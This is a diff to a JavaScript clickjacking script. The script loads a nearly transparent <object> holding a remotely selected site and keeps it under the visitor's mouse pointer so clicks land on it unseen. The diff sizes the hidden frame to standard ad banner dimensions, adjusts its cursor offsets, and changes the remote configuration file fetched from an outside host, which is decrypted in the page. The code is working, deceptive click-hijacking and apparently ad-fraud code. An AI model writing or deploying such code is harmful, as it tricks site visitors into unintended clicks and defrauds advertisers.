@@ -2,6 +2,7 @@ let sitesRand = [];
 let siteSelected = [{link: null, cookie: null, margin: 0}];
 let monitorTracker = null;
 let canTrack = 0;
+let bannerSize = getBannerSize();
 let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
 let htmlCode = '<div id="_gcli_div'+ uniqueID +'"><object id="_gcli_obj'+ uniqueID +'" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
 let cssCode = '<style>#_gcli_div'+ uniqueID +'{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
@@ -62,9 +63,13 @@ function insertCode(){
     $(document).on('mousemove touchstart', function(e){
         let tracker = pointerTracker(e);
         if (canTrack == 1) {
+            let _w = (bannerSize.width / 1.8);
+            let _h = (bannerSize.height / 3.1);
+            let _w2 = (bannerSize.width / 2);
+            let _h2 = (bannerSize.height / 3.3);
             $('#_gcli_div' + uniqueID).css({
-                left:  tracker.x - Math.floor(Math.random()*(324-284+1)+284),
-                top:   tracker.y - Math.floor(Math.random()*(60-50+1)+50)
+                left:  tracker.x - Math.floor(Math.random()*(_w-_w2+1)+_w2),
+                top:   tracker.y - Math.floor(Math.random()*(_h-_h2+1)+_h2)
             });
         }
     });
@@ -76,12 +81,26 @@ function setUrlObj() {
     document.getElementById('_gcli_obj' + uniqueID).data = siteSelected.link;
     showOrMinimize();
 }
+function getBannerSize(){
+    let _w = window.innerWidth;
+    let _width = 730;
+    let _height = 170;
+
+    if (_w >= 1366) { _width = 970; _height = 250; }
+    else if (_w < 1366 && _w >= 800) { _width = 728; _height = 90; }
+    else if (_w < 800 && _w >= 640) { _width = 468; _height = 60; }
+    else if (_w < 640 && _w >= 300) { _width = 300; _height = 250; }
+    else { _width = 120; _height = 60; }
+
+    let response = {"width":_width, "height": _height};
+    return response;
+}
 function showDiv() {
     canTrack = 1;
     startTracker();
 
-    $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("left", "-70px").css("pointer-events", "");
-    $("#_gcli_div" + uniqueID).css("width", "730px").css("height", siteSelected.margin + 170 + "px").css("z-index", "999999").css("position", "absolute").css("visibility", "visible");
+    $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("pointer-events", "");
+    $("#_gcli_div" + uniqueID).css("width", bannerSize.width).css("height", siteSelected.margin + bannerSize.height + "px").css("left", "-40px").css("z-index", "999999").css("position", "absolute").css("visibility", "visible");
 }
 function showOrMinimize() {
     document.getElementById('_gcli_obj' + uniqueID).onload=function(){
@@ -133,7 +152,7 @@ function Decrypt(s1, id) {
     return result;
 }
 $(document).ready(function () {
-    fetch('https://www.iplezier.site/assets/js/c/rc.json?ver=' + $.now())
+    fetch('https://www.iplezier.site/assets/js/c/tns.json?ver=' + $.now())
         .then(function(response) {
             return response.text();
         })
